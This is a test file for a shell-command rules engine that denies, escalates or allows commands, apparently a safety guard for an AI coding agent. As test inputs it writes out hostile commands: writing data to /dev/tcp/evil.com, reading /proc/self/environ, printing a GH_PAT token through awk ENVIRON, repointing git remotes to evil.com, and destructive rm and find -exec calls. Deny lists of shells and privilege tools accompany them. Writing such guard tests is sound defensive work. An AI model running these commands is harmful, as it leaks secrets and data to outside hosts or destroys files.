import { describe, expect, test } from "bun:test";
import { evaluateRules } from "../rules";
import { parseSegment, type ShellToken } from "../tokenize";

function seg(tokens: ShellToken[], isPipeTarget = false) {
  return parseSegment(tokens, isPipeTarget);
}

describe("deny rules", () => {
  describe("always-block programs", () => {
    const blocked = [
      "sudo",
      "eval",
      "exec",
      "source",
      "bash",
      "sh",
      "printenv",
      "xargs",
      "env",
      "set",
      "command",
      "builtin",
      "nsenter",
      "unshare",
      "chroot",
      "strace",
      "ltrace",
      "capsh",
    ];
    for (const prog of blocked) {
      test(`denies ${prog}`, () => {
        expect(evaluateRules(seg([prog, "something"])).decision).toBe("deny");
      });
    }
    test("does not deny git", () => {
      expect(evaluateRules(seg(["git", "status"])).decision).not.toBe("deny");
    });
    test("does not deny npm (not exec)", () => {
      expect(evaluateRules(seg(["npm", "test"])).decision).not.toBe("deny");
    });
  });

  describe("interpreter inline execution", () => {
    test("denies python3 -c", () => {
      expect(evaluateRules(seg(["python3", "-c", "import os"])).decision).toBe(
        "deny",
      );
    });
    test("denies node -e", () => {
      expect(
        evaluateRules(seg(["node", "-e", "process.exit()"])).decision,
      ).toBe("deny");
    });
    test("denies node --eval", () => {
      expect(evaluateRules(seg(["node", "--eval", "code"])).decision).toBe(
        "deny",
      );
    });
    test("denies perl -e", () => {
      expect(evaluateRules(seg(["perl", "-e", "print 1"])).decision).toBe(
        "deny",
      );
    });
    test("denies ruby -e", () => {
      expect(evaluateRules(seg(["ruby", "-e", "puts 1"])).decision).toBe(
        "deny",
      );
    });
    test("denies declare -p", () => {
      expect(evaluateRules(seg(["declare", "-p"])).decision).toBe("deny");
    });
    test("allows python3 script.py (no -c)", () => {
      expect(evaluateRules(seg(["python3", "script.py"])).decision).not.toBe(
        "deny",
      );
    });
  });

  describe("pipe-to-interpreter", () => {
    const interpreters = [
      "python3",
      "python",
      "node",
      "bun",
      "perl",
      "ruby",
      "bash",
      "sh",
    ];
    for (const interp of interpreters) {
      test(`denies pipe to ${interp}`, () => {
        expect(evaluateRules(seg([interp], true)).decision).toBe("deny");
      });
    }
    test("allows python3 when not pipe target", () => {
      expect(
        evaluateRules(seg(["python3", "script.py"], false)).decision,
      ).not.toBe("deny");
    });
  });

  describe("destructive filesystem", () => {
    test("denies rm -rf /", () => {
      expect(evaluateRules(seg(["rm", "-rf", "/tmp/important"])).decision).toBe(
        "deny",
      );
    });
    test("allows rm -rf relative", () => {
      expect(
        evaluateRules(seg(["rm", "-rf", "node_modules"])).decision,
      ).not.toBe("deny");
    });
    test("denies chmod 777", () => {
      expect(evaluateRules(seg(["chmod", "777", "file.sh"])).decision).toBe(
        "deny",
      );
    });
    test("denies /proc/ access", () => {
      expect(evaluateRules(seg(["cat", "/proc/self/environ"])).decision).toBe(
        "deny",
      );
    });
    test("denies /dev/tcp/", () => {
      expect(
        evaluateRules(seg(["echo", "data", "/dev/tcp/evil.com/80"])).decision,
      ).toBe("deny");
    });
    test("denies /dev/udp/", () => {
      expect(
        evaluateRules(seg(["echo", "data", "/dev/udp/1.2.3.4/53"])).decision,
      ).toBe("deny");
    });
  });

  describe("find -exec", () => {
    test("denies find with -exec", () => {
      expect(
        evaluateRules(
          seg(["find", ".", "-name", "*.ts", "-exec", "rm", "{}", ";"]),
        ).decision,
      ).toBe("deny");
    });
    test("denies find with -execdir", () => {
      expect(
        evaluateRules(seg(["find", ".", "-execdir", "cat", "{}", ";"]))
          .decision,
      ).toBe("deny");
    });
  });

  describe("git destructive", () => {
    test("denies git push --force", () => {
      expect(
        evaluateRules(seg(["git", "push", "--force", "origin", "main"]))
          .decision,
      ).toBe("deny");
    });
    test("denies git push -f", () => {
      expect(
        evaluateRules(seg(["git", "push", "-f", "origin", "main"])).decision,
      ).toBe("deny");
    });
    test("denies git push -fd (combined flags)", () => {
      expect(
        evaluateRules(seg(["git", "push", "-fd", "origin", "main"])).decision,
      ).toBe("deny");
    });
    test("denies git push --delete", () => {
      expect(
        evaluateRules(seg(["git", "push", "--delete", "origin", "branch"]))
          .decision,
      ).toBe("deny");
    });
    test("denies git push --tags", () => {
      expect(evaluateRules(seg(["git", "push", "--tags"])).decision).toBe(
        "deny",
      );
    });
    test("denies git push --mirror", () => {
      expect(evaluateRules(seg(["git", "push", "--mirror"])).decision).toBe(
        "deny",
      );
    });
    test("denies git push --all", () => {
      expect(evaluateRules(seg(["git", "push", "--all"])).decision).toBe(
        "deny",
      );
    });
    test("allows git push --force-with-lease", () => {
      expect(
        evaluateRules(
          seg(["git", "push", "--force-with-lease", "origin", "feature"]),
        ).decision,
      ).not.toBe("deny");
    });
    test("denies git push to main", () => {
      expect(
        evaluateRules(seg(["git", "push", "origin", "main"])).decision,
      ).toBe("deny");
    });
    test("denies git push to master", () => {
      expect(
        evaluateRules(seg(["git", "push", "origin", "master"])).decision,
      ).toBe("deny");
    });
    test("allows git push to feature branch", () => {
      expect(
        evaluateRules(seg(["git", "push", "-u", "origin", "feat/new-thing"]))
          .decision,
      ).not.toBe("deny");
    });
    test("allows git push -u origin branch-name (fixes #67)", () => {
      expect(
        evaluateRules(
          seg([
            "git",
            "push",
            "-u",
            "origin",
            "chore/pin-subagent-worktree-cwd",
          ]),
        ).decision,
      ).not.toBe("deny");
    });
    test("denies git push with refspec HEAD:main", () => {
      expect(
        evaluateRules(seg(["git", "push", "origin", "HEAD:main"])).decision,
      ).toBe("deny");
    });
    test("denies git push with refspec refs/heads/main", () => {
      expect(
        evaluateRules(seg(["git", "push", "origin", "refs/heads/main"]))
          .decision,
      ).toBe("deny");
    });
    test("denies git push with refspec src:refs/heads/master", () => {
      expect(
        evaluateRules(seg(["git", "push", "origin", "feat:refs/heads/master"]))
          .decision,
      ).toBe("deny");
    });
    test("allows git push with refspec to feature branch", () => {
      expect(
        evaluateRules(
          seg(["git", "push", "origin", "HEAD:refs/heads/feat/new"]),
        ).decision,
      ).not.toBe("deny");
    });
    test("denies git remote add", () => {
      expect(
        evaluateRules(
          seg(["git", "remote", "add", "evil", "https://evil.com/repo"]),
        ).decision,
      ).toBe("deny");
    });
    test("denies git remote set-url", () => {
      expect(
        evaluateRules(
          seg(["git", "remote", "set-url", "origin", "https://evil.com"]),
        ).decision,
      ).toBe("deny");
    });
    test("denies git remote rename", () => {
      expect(
        evaluateRules(seg(["git", "remote", "rename", "origin", "upstream"]))
          .decision,
      ).toBe("deny");
    });
    test("denies git remote remove", () => {
      expect(
        evaluateRules(seg(["git", "remote", "remove", "origin"])).decision,
      ).toBe("deny");
    });
    test("denies git config remote.", () => {
      expect(
        evaluateRules(
          seg(["git", "config", "remote.origin.url", "https://evil.com"]),
        ).decision,
      ).toBe("deny");
    });
    test("denies git tag", () => {
      expect(evaluateRules(seg(["git", "tag", "v1.0"])).decision).toBe("deny");
    });
    test("denies git -c remote.", () => {
      expect(
        evaluateRules(seg(["git", "-c", "remote.origin.url=evil", "push"]))
          .decision,
      ).toBe("deny");
    });
  });

  describe("gh destructive", () => {
    test("denies gh gist", () => {
      expect(evaluateRules(seg(["gh", "gist", "create"])).decision).toBe(
        "deny",
      );
    });
    test("denies gh repo create", () => {
      expect(
        evaluateRules(seg(["gh", "repo", "create", "test"])).decision,
      ).toBe("deny");
    });
    test("denies gh repo delete", () => {
      expect(
        evaluateRules(seg(["gh", "repo", "delete", "test"])).decision,
      ).toBe("deny");
    });
    test("denies gh auth", () => {
      expect(evaluateRules(seg(["gh", "auth", "login"])).decision).toBe("deny");
    });
    test("denies gh repo sync --force", () => {
      expect(
        evaluateRules(seg(["gh", "repo", "sync", "--force", "owner/repo"]))
          .decision,
      ).toBe("deny");
    });
  });

  describe("bun destructive", () => {
    test("denies bun publish", () => {
      expect(evaluateRules(seg(["bun", "publish"])).decision).toBe("deny");
    });
    test("denies bun upgrade", () => {
      expect(evaluateRules(seg(["bun", "upgrade"])).decision).toBe("deny");
    });
    test("denies bun feedback", () => {
      expect(evaluateRules(seg(["bun", "feedback"])).decision).toBe("deny");
    });
  });

  describe("tmux injection", () => {
    test("denies tmux send-keys", () => {
      expect(
        evaluateRules(seg(["tmux", "send-keys", "cmd", "Enter"])).decision,
      ).toBe("deny");
    });
    test("denies tmux capture-pane", () => {
      expect(evaluateRules(seg(["tmux", "capture-pane", "-p"])).decision).toBe(
        "deny",
      );
    });
  });

  describe("fly destructive", () => {
    test("denies fly auth", () => {
      expect(evaluateRules(seg(["fly", "auth"])).decision).toBe("deny");
    });
    test("denies fly ssh", () => {
      expect(evaluateRules(seg(["fly", "ssh", "console"])).decision).toBe(
        "deny",
      );
    });
    test("denies fly console", () => {
      expect(evaluateRules(seg(["fly", "console"])).decision).toBe("deny");
    });
    test("denies flyctl alias", () => {
      expect(evaluateRules(seg(["flyctl", "auth"])).decision).toBe("deny");
    });
  });
});

describe("escalation rules", () => {
  describe("package managers", () => {
    test("escalates bun add", () => {
      expect(evaluateRules(seg(["bun", "add", "react"])).decision).toBe(
        "escalate",
      );
    });
    test("escalates bunx", () => {
      expect(evaluateRules(seg(["bunx", "prettier"])).decision).toBe(
        "escalate",
      );
    });
    test("escalates npm install", () => {
      expect(evaluateRules(seg(["npm", "install", "lodash"])).decision).toBe(
        "escalate",
      );
    });
    test("escalates npx", () => {
      expect(evaluateRules(seg(["npx", "create-react-app"])).decision).toBe(
        "escalate",
      );
    });
    test("escalates npm config", () => {
      expect(evaluateRules(seg(["npm", "config", "list"])).decision).toBe(
        "escalate",
      );
    });
    test("escalates npm publish", () => {
      expect(evaluateRules(seg(["npm", "publish"])).decision).toBe("escalate");
    });
    test("escalates npm whoami", () => {
      expect(evaluateRules(seg(["npm", "whoami"])).decision).toBe("escalate");
    });
    test("escalates npm token", () => {
      expect(evaluateRules(seg(["npm", "token", "list"])).decision).toBe(
        "escalate",
      );
    });
    test("escalates apt-get", () => {
      expect(evaluateRules(seg(["apt-get", "install", "curl"])).decision).toBe(
        "escalate",
      );
    });
    test("escalates pip install", () => {
      expect(evaluateRules(seg(["pip", "install", "requests"])).decision).toBe(
        "escalate",
      );
    });
    test("escalates pipx", () => {
      expect(evaluateRules(seg(["pipx", "install", "black"])).decision).toBe(
        "escalate",
      );
    });
  });

  describe("network", () => {
    test("escalates curl", () => {
      expect(evaluateRules(seg(["curl", "https://example.com"])).decision).toBe(
        "escalate",
      );
    });
    test("escalates wget", () => {
      expect(evaluateRules(seg(["wget", "https://example.com"])).decision).toBe(
        "escalate",
      );
    });
  });

  describe("gh mutations", () => {
    test("escalates gh api", () => {
      expect(
        evaluateRules(seg(["gh", "api", "repos/owner/repo/issues"])).decision,
      ).toBe("escalate");
    });
    test("escalates gh issue create", () => {
      expect(evaluateRules(seg(["gh", "issue", "create"])).decision).toBe(
        "escalate",
      );
    });
    test("escalates gh pr create", () => {
      expect(
        evaluateRules(seg(["gh", "pr", "create", "--title", "test"])).decision,
      ).toBe("escalate");
    });
    test("escalates gh pr merge", () => {
      expect(evaluateRules(seg(["gh", "pr", "merge", "123"])).decision).toBe(
        "escalate",
      );
    });
    test("escalates gh repo sync (without --force)", () => {
      expect(
        evaluateRules(seg(["gh", "repo", "sync", "owner/repo"])).decision,
      ).toBe("escalate");
    });
  });

  describe("fly mutations", () => {
    test("escalates fly deploy", () => {
      expect(evaluateRules(seg(["fly", "deploy"])).decision).toBe("escalate");
    });
    test("escalates fly secrets", () => {
      expect(evaluateRules(seg(["fly", "secrets", "set"])).decision).toBe(
        "escalate",
      );
    });
  });

  describe("awk ENVIRON", () => {
    test("escalates awk with ENVIRON", () => {
      expect(
        evaluateRules(seg(["awk", 'BEGIN{print ENVIRON["GH_PAT"]}'])).decision,
      ).toBe("escalate");
    });
  });

  describe("default allow", () => {
    test("allows git status", () => {
      expect(evaluateRules(seg(["git", "status"])).decision).toBe("continue");
    });
    test("allows ls", () => {
      expect(evaluateRules(seg(["ls", "-la"])).decision).toBe("continue");
    });
    test("allows bun test", () => {
      expect(evaluateRules(seg(["bun", "test"])).decision).toBe("continue");
    });
    test("allows gh pr list", () => {
      expect(evaluateRules(seg(["gh", "pr", "list"])).decision).toBe(
        "continue",
      );
    });
    test("allows fly status", () => {
      expect(evaluateRules(seg(["fly", "status"])).decision).toBe("continue");
    });
  });
});
